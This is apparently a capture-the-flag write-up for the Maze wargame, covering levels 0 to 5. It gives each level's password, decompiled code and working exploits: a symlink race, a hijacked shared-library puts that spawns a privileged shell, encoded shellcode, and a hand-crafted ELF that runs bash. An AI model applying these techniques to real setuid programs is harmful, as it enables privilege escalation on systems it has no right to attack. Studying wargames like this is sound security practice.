
―――――――――――――――――――――――――――――――――――――――――――――――[ Maze ]―――――――――――――――――――――――――――――――――――――――――――――

Level:     0
Exploit:   Race Condition
Password:  kfL7RRfpkY

Exploit mitigations: stack canary & NX

ghidra decompile:
  int main(int argc,char **argv) {
    int iVar1;
    int iVar2;
    __uid_t __suid;
    __uid_t __euid;
    __uid_t __ruid;
    int in_GS_OFFSET;
    char **argv_local;
    int fd;
    char buf [20];
  
    iVar1 = *(int *)(in_GS_OFFSET + 0x14);
    memset(buf,0,0x14);
    iVar2 = access("/tmp/128ecf542a35ac5270a87dc740918404",4);   <-- attempts to access file
    if (iVar2 == 0) {
      __suid = geteuid();
      __euid = geteuid();
      __ruid = geteuid();
      setresuid(__ruid,__euid,__suid);
      iVar2 = open("/tmp/128ecf542a35ac5270a87dc740918404",0);   <-- attempts to open file
      if (iVar2 < 0) {
        /* WARNING: Subroutine does not return */
        exit(-1);
      }
      read(iVar2,buf,0x13);                                      <-- read 0x13 bytes into buf
      write(1,buf,0x13);                                         <-- write buf to stdout
    }
    if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
      /* WARNING: Subroutine does not return */
      __stack_chk_fail(argv);
    }
    return 
}  

The program first checks if the file is accessible. Then it escalates its priviledges. It then 
attempts to open the file and read from it.
We must first provide a file with appropriate access and then swap it to a symbolic link to the 
password.

To simulate the race condition, we can open 2 processes, one for constantly running maze0, and
another for swapping the file between ownership of maze0 & maze1

$ while [ 1 ]; do /maze/maz0; done
$ while [ 1 ]; do ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404;
  ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404; done 

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     1
Exploit:   function hooking
Password:  PBeZRPjetr

Exploit mitigations: NX

Running the program results in the following:
$ ./maze1
error while loading shared libraries: ./libc.so.4: cannot open shared object file: 
No such file or directory.

This means that the binary was meant to use libc.so.4 shared library but the loader cannot find
such a file.

ghidra decompile:
int main(void) {
  puts("Hello World!\n");
  return 0;
}

Attempt to hook puts with a custom libc.so.4 
Perhaps modify puts to open shell 

custom puts implementation:
  #include <unistd.h>
  int puts(const char* str) {
	  char *const argv[] = {"/bin/bash", "-p" NULL};            <-- priviledge preserve flag
		char *const envp[] = {NULL};
	  execve("/bin/bash", argv, envp);
    return 0;
  }

$ gcc -m32 -c -fPIC -fno-stack-protector custom_puts.c 
$ ld -shared -m elf i386 -o libc.so.4 custom_puts.o -ldl

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     2
Exploit:   shellcode
Password:  DSEiCewQOv

Exploit mitigations: Stack Canaries

ghidra decompile:
  int main(int argc, char **argv) {
    int iVar1;
    int in_GS_OFFSET;
    char **argv_local;
    _func_void_varargs *fp;
    char code [8];
  
    iVar1 = *(int *)(in_GS_OFFSET + 0x14);
    if (argc != 2) {
      exit(1);
    }
    strncpy(code,argv[1],8);
    (*(code *)code)();                                      <-- Execute code[8]
    if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {           <-- Stack Canary check
      __stack_chk_fail();
    }
    return 0;
  }    

Because of stack canary we cannot overwrite the return address. Also there is no way to leak the 
stack canary before executing code[]. 
Hijack the eip to point to shellcode (stored in an env var because 8 bytes is too small)

$ export EXPLOIT=$(perl -e 'print "\x90"x1000 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
  \x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')

Generate shellcode for making eip go to exploit
  global _start

  section .text
  _start:
    push 0xaabbccdd          <-- Address to ret to
    ret

$ nasm -f elf32 seteip.asm
$ ld -m elf_i386 seteip.o 
$ objdump -d a.out

This gives the shellcode: 68 dd cc bb aa c3
Find the exploit env var 0xffffd1e9 ~0xffffd310

$ ./maze2 $(perl -e 'print "\x68\x10\xd3\xff\xff\xc3"') 

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     3
Exploit:   reverse engineering
Password:  vghylBpihH

Exploit mitigations: runtime encryption

Running the binary gives us the following
$ ./maze3
./level4 ev0lcmds!

There is no main symbol. 
$ objdump -d maze3 
shows _start, fine, l1, & d1 frames

Rough decompilation:
  uintptr_t ebx = 0x8049000 & 0xfffff000;
  int eax = 0x7d;
  int ecx = 0xa3;
  int edx = 0x7;

  // int 0x80 syscall with eax=0x7d, ebx=ebx, ecx=0xa3, edx=7
  // change access protections for 0x8049000 length 0xa3 to RWX.
  mprotect(0x8049000, 0xa3, 0x7)

  // Setup pointers for loop
  unsigned char *esi = (unsigned char *)0x804906b;
  unsigned char *edi = esi;
  ecx = 0x38;
  edx = 0x12345678;

  // Loop: for (ecx 56 times) { eax = *esi; eax ^= edx; *edi = eax; esi++; edi++; ecx--; }
	// XOR loop
  while (ecx--) {
    unsigned char eax_byte = *esi;
    eax_byte ^= (unsigned char)edx;
    *edi = eax_byte;
    esi++;
    edi++;
  }

  // pop %eax simulated by reading an int pointer (simulate)
  int *ptr = (int *)eax; // eax was 0x7d before, but pop eax is unknown here, simulate with eax
  // Compare *(int *)eax with 0x1337c0de
  if (ptr && *ptr == 0x1337c0de) {                   <-- Satisfying this condition gives shell
    ebx = 0x3a9c;
    eax = 0x46; // push 0x46; pop eax

    ecx = ebx;
    // int 0x80 syscall with eax=0x46, ebx=ebx, ecx=ecx
    // No direct equivalent, skip or simulate

    eax = 0;
    // Prepare stack for execve("/bin//sh", NULL, NULL)
    char *sh = "/bin//sh";
    char *argv[] = {sh, NULL};
    char *envp[] = {NULL};
    execve(sh, argv, envp);
  }

  // Exit syscall
  eax = 1;
  ebx = 0;
  ebx++;
  _exit(1);

  return 0;

Overall, the decompilation looks more like assembly rather than compiled C code
$ ./maze3 $(perl -e 'print "\xde\xc0\x37\x13"')

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     4
Exploit:   reverse engineering
Password:  fobwgnzRy0

Exploit mitigations: stack canary & NX

ghidra decompile
int main(int argc,char **argv) {
  int iVar1;
  int __fd;
  int iVar2;
  int in_GS_OFFSET;
  char **argv_local;
  int fd;
  Elf32_Phdr phdr;
  stat st;
  Elf32_Ehdr ehdr;

  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc != 2) {                                    <-- filename arg
    printf("usage: %s file2check\n",*argv);
    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  __fd = open(argv[1],0);                             <-- open file
  if (__fd < 0) {
    perror("open");
    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  iVar2 = stat(argv[1],(stat *)&st);                  <-- get stats
  if (iVar2 < 0) {
    perror("stat");
    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  read(__fd,&ehdr,0x34);                              <-- read elf header
  lseek(__fd,ehdr.e_phoff,0);                         <-- goto first program header
  read(__fd,&phdr,0x20);                              <-- read elf program header 
	// Checks if phdr.p_addr (physical addr of beginning of segment = elf id byte 7 * byte 8
  if ((phdr.p_paddr == (uint)ehdr.e_ident[8] * (uint)ehdr.e_ident[7]) && (st.st_size < 0x7c)) {
    puts("valid file, executing");
    execv(argv[1],(char **)0x0);
  }
  fwrite("file not executed\n",1,0x12,stderr);
  close(__fd);
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

Must craft an elf file to pass condition on phdr, ehdr, and file size. It must also contain instrs
to open shell. Total file size must be less than 128 bytes

BITS 32
; ELF Header (52 bytes)
org 0x08048000          ; Use a standard load address

ehdr:
; e_ident (16 bytes)
  db 0x7F, "ELF"      ; Magic bytes (0-3)
  db 1                ; Class: 32-bit (4)
  db 1                ; Data: Little Endian (5)
  db 1                ; Version: 1 (6)
  db 0x2              ; [TARGET] e_ident[7] (OSABI) <--- CHANGE THIS
  db 0x1              ; [TARGET] e_ident[8] (ABIVERSION) <--- CHANGE THIS
  db "AABBCCD"         ; Padding (9-15)

  dw 2                ; e_type: ET_EXEC (Executable file)
  dw 3                ; e_machine: EM_386 (Intel 80386)
  dd 1                ; e_version: EV_CURRENT
  dd _start           ; e_entry: Memory address where code starts
  dd phdr - ehdr      ; e_phoff: Offset to Program Header (Start of Phdr)
  dd 0                ; e_shoff: Section header table offset (0 = none)
  dd 0                ; e_flags
  dw ehdr_size        ; e_ehsize: Size of this header (52)
  dw phdr_size        ; e_phentsize: Size of program header entry (32)
  dw 1                ; e_phnum: Number of program headers
  dw 0                ; e_shentsize: Section header entry size (0)
  dw 0                ; e_shnum: Number of section headers (0)
  dw 0                ; e_shstrndx: String table index (0)

ehdr_size equ $ - ehdr

; Program Header (32 bytes)
phdr:
  dd 1                ; p_type: PT_LOAD
  dd 0                ; p_offset: Start of file
  dd 0x08048000       ; p_vaddr: Virtual address in memory
  dd 0x2              ; p_paddr: Physical Address
  dd filesize         ; p_filesz: Size in file
  dd filesize         ; p_memsz: Size in memory
  dd 7                ; p_flags: RWX (Read, Write, Execute)
  dd 0x1000           ; p_align: Alignment (4096)

phdr_size equ $ - phdr

; Code Section (must be less than 40 bytes)
_start:
  xor eax, eax        ; EAX = 0 (Used for NULLs)
  push eax            ; Null terminator for "-p"
  push word 0x702d    ; Push "-p" (0x70='p', 0x2d='-')
  mov esi, esp        ; ESI = Pointer to "-p"

  push eax            ; Null terminator
  push 0x68736162     ; "bash"
  push 0x2f6e6962     ; "bin/"
  push 0x2f2f2f2f     ; "////" (Padding)
  mov ebx, esp        ; EBX = Pointer to "/bin/bash"

  push eax            ; Push NULL (End of array)
  push esi            ; Push Pointer to "-p"
  push ebx            ; Push Pointer to "/bin/bash"
  mov ecx, esp        ; ECX = Pointer to the array (argv)

  xor edx, edx        ; EDX = 0 (envp = NULL)
  mov al, 11          ; Syscall 11 (execve)
  int 0x80

filesize equ $ - ehdr

The payload or "functionality" of crafted elf file is to call execve("\bin\bash", -p, NULL)
Assemble and verify that the crafted elf file verifies the condition
$ nasm -f bin exploit.asm -o exploit
$ wc exploit  // must be less than 124
$ readelf -h exploit
$ readelf -l exploit 

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     5
Exploit:   reverse engineering
Password:  dOM2C7ZKlG

Exploit mitigations: stack canary & NX

ghidra decompile
int main(void) {
  int iVar1;
  size_t sVar2;
  long lVar3;
  int iVar4;
  __uid_t __euid;
  __uid_t __ruid;
  int in_GS_OFFSET;
  char user [9];
  char pass [9];
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  puts("X----------------");
  printf(" Username: ");                                       <-- get username
  __isoc99_scanf(&DAT_0804a026,user);
  printf("      Key: ");                                       <-- get password
  __isoc99_scanf(&DAT_0804a026,pass);
  sVar2 = strlen(user);
  if ((sVar2 != 8) || (sVar2 = strlen(pass), sVar2 != 8)) {    <-- user & pass must be length 8
    puts("Wrong length you!");
    exit(-1);
  }
  lVar3 = ptrace(PTRACE_TRACEME,0,0,0);
  if (lVar3 == 0) {
    iVar4 = foo(user,pass);
    if (iVar4 == 0) {
      puts("\nNah, wrong.");
    }
    else {
      puts("\nYeh, here\'s your shell");
      __euid = geteuid();
      __ruid = geteuid();
      setreuid(__ruid,__euid);
      system("/bin/sh");
    }
  }
  else {
    puts("\nnahnah...");
  }
  if (iVar1 == *(int *)(in_GS_OFFSET + 0x14)) {
    return 0;
  }
  __stack_chk_fail();
}

int foo(char *s,char *a) {
  int iVar1;
  int iVar2;
  size_t sVar3;
  int iVar4;
  int in_GS_OFFSET;
  char *a_local;
  char *s_local;
  int i;
  int x;
  char cStack_12;
  char p [9];
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  builtin_strncpy(p,"printlol",9);                             <-- copy printlol into p
  for (i = 0; sVar3 = strlen(s), (uint)i < sVar3; i = i + 1) {
    p[i] = p[i] - ((char)i * '\x02' + s[i] + -0x41);           <-- transform p depending on (user)
  }
  do {
    iVar4 = i + -1;
    if (i == 0) {
      iVar4 = 1;
      goto LAB_080492b5;                                       <-- must hit this goto
    }
    iVar2 = i + -1;
    i = iVar4;
  } while (p[iVar2] == a[iVar4]);                              <-- transformed user must equal pass
  iVar4 = 0;
LAB_080492b5:
  if (iVar1 == *(int *)(in_GS_OFFSET + 0x14)) {
    return iVar4;
  }
  __stack_chk_fail();
}

In order to trigger shell, we must pass in user name and password of both length 8 and such that
transformed user will equal password
where p[] = printlol
p[i] = p[i] - (i * 2 + user[i] - 0x41)

If we keep the transformed user the same at printlol, thus the password, then the original username
must be 
user[] = 'A?=;9753'

p[0] = p, i = 0    112 - (0 * 2 + 0x41 - 0x41) = 112 (p)
p[1] = r, i = 1    114 - (1 * 2 + 0x3f - 0x41) = 114 (r)
p[2] = i, i = 2    105 - (2 * 2 + 0x3d - 0x41) = 105 (i)
p[3] = n, i = 3    110 - (3 * 2 + 0x3b - 0x41) = 110 (n)
p[4] = t, i = 4    116 - (4 * 2 + 0x39 - 0x41) = 116 (t)
p[5] = l, i = 5    108 - (5 * 2 + 0x37 - 0x41) = 108 (l)
p[6] = o, i = 6    111 - (6 * 2 + 0x35 - 0x41) = 111 (o)
p[7] = l, i = 7    108 - (7 * 2 + 0x33 - 0x41) = 108 (l)

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     6
Exploit:   
Password:  

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     7
Exploit:   
Password:  

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

Level:     8
Exploit:   
Password:  

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

